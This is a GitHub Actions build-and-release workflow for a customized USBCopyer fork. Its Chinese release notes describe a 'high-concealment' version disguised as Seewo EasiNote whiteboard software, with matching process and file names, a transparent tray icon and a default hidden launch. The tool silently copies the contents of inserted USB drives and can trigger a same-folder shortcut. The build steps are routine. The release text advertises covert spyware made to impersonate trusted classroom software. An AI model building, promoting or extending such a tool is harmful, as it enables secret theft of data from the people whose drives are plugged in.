name: build

on:
  workflow_dispatch:
  push:
    branches: [ master ]
  pull_request:

env:
  VERSION: 5.11-gh9

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v4

    - name: Add msbuild to PATH
      uses: microsoft/setup-msbuild@v2

    - name: Clean Release directory
      shell: pwsh
      run: |
        if (Test-Path Release) { Remove-Item -Recurse -Force Release }

    - name: Restore NuGet packages
      run: msbuild USBCopyer\USBCopyer.csproj -t:restore -p:Configuration=Release -p:Platform="Any CPU"

    - name: Build Release
      run: msbuild USBCopyer.sln -t:build -p:Configuration=Release -p:Platform="Any CPU"

    - name: Rename assets with version
      shell: pwsh
      run: |
        Get-ChildItem Release -Filter *.exe | ForEach-Object {
          $new = $_.BaseName + ".v$env:VERSION" + $_.Extension
          Move-Item $_.FullName (Join-Path $_.DirectoryName $new)
        }
        Get-ChildItem Release | Select-Object Name, Length

    - uses: actions/upload-artifact@v4
      with:
        name: EasiNote-v${{ env.VERSION }}
        path: Release/

  release:
    needs: build
    # 全自动发布：任何成功的编译（手动触发）即自动发布正式 Release
    if: github.event_name == 'workflow_dispatch' || github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
    - uses: actions/download-artifact@v4
      with:
        name: EasiNote-v${{ env.VERSION }}
        path: dist

    - name: Publish GitHub Release
      uses: softprops/action-gh-release@v2
      with:
        tag_name: v${{ env.VERSION }}
        name: EasiNote v${{ env.VERSION }}
        body: |
          EasiNote —— USBCopyer 高隐藏性定制版

          - 伪装为希沃白板5（EasiNote）：程序名 / 进程名 / exe 文件名 / 界面文案一致；exe 使用 Windows 默认图标，托盘图标为全透明
          - 默认隐藏启动：无窗口、无托盘图标，仅显式 `-gui` 参数才显示界面
          - `-launch` 参数（兼容 `/launch`）：执行与 exe 同目录的 `launcher.lnk`，其指向目标由该 lnk 自身决定；无参数双击不执行 lnk，仅隐藏运行
          - 单实例检测改用 Mutex，与真实希沃白板进程互不干扰
          - U盘别名映射（disk_mapping.ini，与 exe 同级）、黑白名单、回调、Disks.csv 等全部功能保留
          - 已修复文件大小限制整数溢出：filesize ≥ 2048MB 时原先所有文件被误判超限而跳过
          - 目录时间戳与源目录一致（创建/修改时间不再是插盘时刻）；文件时间戳由 File.Copy 原生保留

          使用：`EasiNote.exe -setting` 打开设置界面；`-gui` 显示界面；`-launch` 执行同目录 launcher.lnk；默认（无参数）隐藏运行。
          版本 v${{ env.VERSION }}（跟随上游 V5.11，`-gh` 后缀为定制批次序号）
        files: dist/*
